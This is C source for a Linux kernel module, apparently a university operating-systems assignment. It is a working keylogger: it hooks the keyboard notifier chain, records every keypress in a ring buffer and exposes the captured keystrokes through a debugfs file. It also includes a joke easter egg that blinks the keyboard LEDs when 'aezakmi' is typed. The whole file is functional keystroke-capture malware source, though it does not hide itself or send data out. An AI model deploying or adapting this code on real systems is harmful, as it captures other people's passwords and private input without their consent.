#include <linux/init.h>
#include <linux/kd.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>
#include <linux/tty.h>
#include <linux/vt.h>
#include <linux/vt_kern.h>
#include <linux/console_struct.h>

#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
#define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */

#define BLINK_DELAY HZ / 5 
#define ALL_LEDS_ON 0x07 
#define RESTORE_LEDS 0xFF
#define NUMBER_OF_BLINKS 10

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Karol Gebski, Michal Bernacki");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Zadanie na Systemy Operacyjne");

/* Declarations */
static struct timer_list my_timer; 
static struct tty_driver *my_driver; 
static unsigned long kbledstatus = 0; 

static struct dentry *file;
static struct dentry *subdir;

static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);
static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param);
void keycode_to_string(int keycode, int shift_mask, char *buf);
void blink(struct timer_list *unused);
void blink_keyboard(void);

static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};

static size_t buf_pos;
static char keys_buf[BUF_LEN];
static int index = 0;
static int blinks = 0;

const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};


static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset)
{
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

static struct notifier_block keylogger_blk = {
	.notifier_call = keylogger_cb,
};

void blink(struct timer_list *unused)
{
	struct tty_struct *t = vc_cons[fg_console].d->port.tty; 
 
    if (kbledstatus == ALL_LEDS_ON) 
        kbledstatus = RESTORE_LEDS; 
    else 
        kbledstatus = ALL_LEDS_ON; 
 
    (my_driver->ops->ioctl)(t, KDSETLED, kbledstatus); 
 
    my_timer.expires = jiffies + BLINK_DELAY;
	if ((blinks++) < NUMBER_OF_BLINKS) {
    	add_timer(&my_timer);
	}
	else {
		blinks = 0;
	}
}


void keycode_to_string(int keycode, int shift_mask, char *buf)
{
    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
        const char *us_key = (shift_mask == 1)
        ? us_keymap[keycode][1]
        : us_keymap[keycode][0];

		char *ester_egg_password[] = {"a", "e", "z", "a", "k", "m", "i"};
		if (us_key == ester_egg_password[index]) {
			index++;
			if (index == 7){
				pr_info("GODMONE\n");
				my_timer.expires = jiffies + BLINK_DELAY; 
    			add_timer(&my_timer);
				index = 0; 
			}
		}
		else {
			index = 0;
			if (us_key == ester_egg_password[index])
				index++;
		}

        snprintf(buf, CHUNK_LEN, "%s", us_key);
    }
}

int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
	size_t len;
	char keybuf[CHUNK_LEN] = {0};
	struct keyboard_notifier_param *param = _param;

	if (!(param->down))
		return NOTIFY_OK;

	keycode_to_string(param->value, param->shift, keybuf);
	len = strlen(keybuf);
	if (len < 1) /* Unmapped keycode */
		return NOTIFY_OK;

	if ((buf_pos + len) >= BUF_LEN)
		buf_pos = 0;

	strncpy(keys_buf + buf_pos, keybuf, len);
	buf_pos += len;

	return NOTIFY_OK;
}

static int __init keylogger_init(void)
{
	pr_info("Load\n");

	for (int i = 0; i < MAX_NR_CONSOLES; i++) { 
        if (!vc_cons[i].d) 
            break; 
    }

	my_driver = vc_cons[fg_console].d->port.tty->driver;

	timer_setup(&my_timer, blink, 0);

	subdir = debugfs_create_dir("keylogger_bonus", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
	if (!file) {
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}

	register_keyboard_notifier(&keylogger_blk);
	return 0;
}

static void __exit keylogger_exit(void)
{
	pr_info("Unload\n");
	unregister_keyboard_notifier(&keylogger_blk);
	debugfs_remove_recursive(subdir);
	del_timer(&my_timer); 
    (my_driver->ops->ioctl)(vc_cons[fg_console].d->port.tty, KDSETLED, 
                            RESTORE_LEDS);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
